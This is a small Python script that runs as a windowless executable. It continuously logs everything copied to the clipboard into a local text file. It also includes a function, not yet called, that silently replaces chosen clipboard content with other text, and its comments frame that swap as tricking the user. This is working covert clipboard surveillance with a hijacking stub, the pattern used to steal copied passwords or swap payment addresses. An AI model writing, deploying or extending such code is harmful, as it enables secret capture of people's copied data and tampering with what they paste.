'''
paste_log.py, version 1.0.1
script for logging copy-paste content
pyinstaller proper command:
    pyinstaller -F --noconsole paste_log.py
'''
import sys
import os
import time
import pyperclip

def script_path():
    path = os.path.realpath(os.path.dirname(sys.argv[0]))
    os.chdir(path)
    return path
    
def simple_write(file, str_content):
    '''simple_write data to .txt file, with specified strContent'''
    with open(file, "a") as f:
        f.write(str_content + "\n")
        f.close()
    return True
    
def log_changes():
    lastContent = ""
    while True:
        content = pyperclip.paste()
        if content != lastContent:
            # print("current conent: {}".format(content))   # just for debugging
            simple_write("paste_log.txt", content + "\n" + 20*"--" + "\n")
            lastContent = content
        time.sleep(0.1)
    return True
    
def replace_clipboard(search, thing):
    ''' wait for "search" var occurrence and replace it with "thing" var '''
    while True:
        content = pyperclip.paste()
        if content == search:       # this is the simplest condition; thinkg of regex etc
            pyperclip.copy(thing)
        time.sleep(0.1)
    return True
    
    
if __name__ == "__main__":
    path = script_path()
    log_changes()                                       # control changes and log clipboard
    # replace_clipboard("test", "tricked")              # control clipboard and replace with specified phrase
    # to be coded
    # to be coded
